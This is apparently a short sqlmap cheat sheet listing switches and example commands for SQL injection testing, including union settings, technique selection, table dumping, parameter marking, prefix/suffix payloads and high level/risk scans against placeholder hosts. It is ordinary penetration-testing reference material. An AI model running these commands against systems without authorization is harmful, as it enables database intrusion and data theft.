

### Switches
Applying cookies parameter
```shell-session
--cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```
Specify method
```shell-session
--method PUT
```
Parse errors
```
--parse-errors
```
Verbose output
```shell-session
-v 6
```
Send data through proxy
```
--proxy
```
Specify response code
```
--code=200
```
Look for string
```
--string=success
```
Specify union column count
```
--union-cols=17
```
Specify table to union from
```
--union-from=users
```
Specify technique to use
```
--technique=BEU
```
Specify table to dump
```
-T TABLE_NAME --dump
```
### Command Cases

Storing traffic to file
```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

Marking parameters
```shell-session
sqlmap 'http://www.example.com/' -p uid
```
```shell-session
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```


Using request files(burp suite intercept request)
```shell-session
sqlmap -r req.txt
```

Specifying prefix and suffix
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Specify level and risk
```shell-session
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```

